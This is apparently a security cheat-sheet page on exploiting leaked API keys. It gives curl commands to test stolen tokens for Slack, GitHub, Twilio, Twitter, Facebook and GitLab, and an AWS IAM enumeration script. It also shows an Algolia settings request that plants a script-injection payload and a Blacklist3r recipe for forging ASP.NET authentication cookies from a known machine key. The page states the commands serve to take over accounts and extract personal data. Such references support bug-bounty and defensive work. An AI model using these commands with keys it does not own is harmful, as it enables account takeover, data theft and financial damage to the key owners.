API Key Leaks
The API key is a unique identifier that is used to authenticate requests associated with your project. Some developpers might hardcode them or leave it on public shares.
Summary
•	Tools
•	Exploit
o	Google Maps
o	Algolia
o	AWS Access Key ID & Secret
o	Slack API Token
o	Facebook Access Token
o	Github client id and client secret
o	Twilio Account_sid and Auth Token
o	Twitter API Secret
o	Twitter Bearer Token
o	Gitlab Personal Access Token
o	Auth Bypass using pre-published Machine Key
Tools
•	KeyFinder - is a tool that let you find keys while surfing the web!
•	Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.
Exploit
The following commands can be used to takeover accounts or extract personnal informations from the API using the leaked token.
Google Maps
Use : https://github.com/ozguralp/gmapsapiscanner/
Impact:
•	Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
•	Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account
Algolia
curl --request PUT \
  --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
  --header 'content-type: application/json' \
  --header 'x-algolia-api-key: <example-key>' \
  --header 'x-algolia-application-id: <example-application-id>' \
  --data '{"highlightPreTag": "<script>alert(1);</script>"}'
AWS Access Key ID & Secret
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
./enumerate-iam.py --access-key AKIA... --secret-key XXX..
Slack API Token
curl -sX POST "https://slack.com/api/auth.test?token=xoxp-TOKEN_HERE&pretty=1"
Facebook Access Token
curl https://developers.facebook.com/tools/debug/accesstoken/?access_token=ACCESS_TOKEN_HERE&version=v3.2
Github client id and client secret
curl 'https://api.github.com/users/whatever?client_id=xxxx&client_secret=yyyy'
Twilio Account_sid and Auth token
curl -X GET 'https://api.twilio.com/2010-04-01/Accounts.json' -u ACCOUNT_SID:AUTH_TOKEN
Twitter API Secret
curl -u 'API key:API secret key' --data 'grant_type=client_credentials' 'https://api.twitter.com/oauth2/token'
Twitter Bearer Token
curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscriptions/count.json --header 'authorization: Bearer TOKEN'
Gitlab Personal Access Token
curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
Auth Bypass using pre-published Machine Key
By default, ASP.NET creates a Forms Authentication Ticket with unique a username associated with it, Date and Time at which the ticket was issued and expires. So, all you need is just a unique username and a machine key to create a forms authentication token
That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
Exploit with Blacklist3r
# decrypt cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes

# encrypt cookie (edit Decrypted.txt)
$ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
References
•	Finding Hidden API Keys & How to use them - Sumit Jain - August 24, 2019
•	Private API key leakage due to lack of access control - yox - August 8, 2018
•	Project Blacklist3r - November 23, 2018 - @notsosecure

